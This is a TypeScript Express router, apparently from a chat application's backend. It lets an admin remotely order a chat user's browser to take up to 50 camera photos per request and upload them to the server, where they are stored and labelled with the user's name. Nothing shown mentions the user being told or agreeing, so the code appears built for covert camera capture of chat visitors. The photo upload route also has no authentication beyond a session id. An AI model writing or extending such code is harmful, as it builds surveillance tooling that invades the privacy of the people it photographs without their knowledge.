/**
 * Capture command system
 * Admin sends command → stored in memory → user's browser polls → captures photo → uploads here
 */
import { Router, type Request, type Response } from "express";
import multer from "multer";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import { db, mediaFilesTable, chatSessionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { requireAdmin } from "./admin.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const UPLOAD_DIR = path.join(__dirname, "../../uploads");
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

// In-memory capture command queue: sessionId → pending count
const pendingCaptures = new Map<string, number>();

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, UPLOAD_DIR),
  filename: (_req, file, cb) => {
    const ext = path.extname(file.originalname) || ".jpg";
    cb(null, `cap-${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`);
  },
});
const upload = multer({ storage, limits: { fileSize: 20 * 1024 * 1024 } });

const router = Router();

// POST /api/admin/sessions/:sessionId/capture — admin triggers camera capture
router.post("/admin/sessions/:sessionId/capture", async (req: Request, res: Response) => {
  const adminId = await requireAdmin(req, res);
  if (!adminId) return;

  const sessionId = String(req.params.sessionId);
  const count = parseInt((req.body as any)?.count ?? "1");
  if (isNaN(count) || count < 1 || count > 50) {
    res.status(400).json({ error: "count must be 1-50" });
    return;
  }

  // Verify session exists
  const [session] = await db.select().from(chatSessionsTable).where(eq(chatSessionsTable.id, sessionId));
  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  // Add to pending (accumulate)
  const existing = pendingCaptures.get(sessionId) ?? 0;
  pendingCaptures.set(sessionId, existing + count);

  res.json({ success: true, pending: existing + count });
});

// GET /api/chat/:sessionId/pending-capture — user's browser polls this
// Returns { count: N } and CLEARS the pending count (atomic consume)
router.get("/chat/:sessionId/pending-capture", async (req: Request, res: Response) => {
  const sessionId = String(req.params.sessionId);
  const count = pendingCaptures.get(sessionId) ?? 0;
  if (count > 0) pendingCaptures.delete(sessionId);
  res.json({ count });
});

// POST /api/chat/:sessionId/photo — user's browser uploads captured photo
router.post("/chat/:sessionId/photo", async (req: Request, res: Response) => {
  const sessionId = String(req.params.sessionId);

  // Verify session exists (no admin auth needed — user is uploading)
  const [session] = await db.select().from(chatSessionsTable).where(eq(chatSessionsTable.id, sessionId));
  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  upload.single("photo")(req, res, async (err) => {
    if (err) { res.status(400).json({ error: err.message }); return; }
    if (!req.file) { res.status(400).json({ error: "No photo" }); return; }

    const url = `/api/uploads/${req.file.filename}`;
    const label = `${session.userName || sessionId.slice(0, 8)} — ${new Date().toLocaleTimeString()}`;

    await db.insert(mediaFilesTable).values({
      filename: req.file.filename,
      originalName: label,
      mimeType: req.file.mimetype || "image/jpeg",
      size: String(req.file.size),
      url,
      uploadedBy: 0,
    });

    res.status(201).json({ success: true, url });
  });
});

// GET /api/admin/sessions/:sessionId/capture/status — check pending count
router.get("/admin/sessions/:sessionId/capture/status", async (req: Request, res: Response) => {
  const adminId = await requireAdmin(req, res);
  if (!adminId) return;
  const count = pendingCaptures.get(String(req.params.sessionId)) ?? 0;
  res.json({ pending: count });
});

export default router;
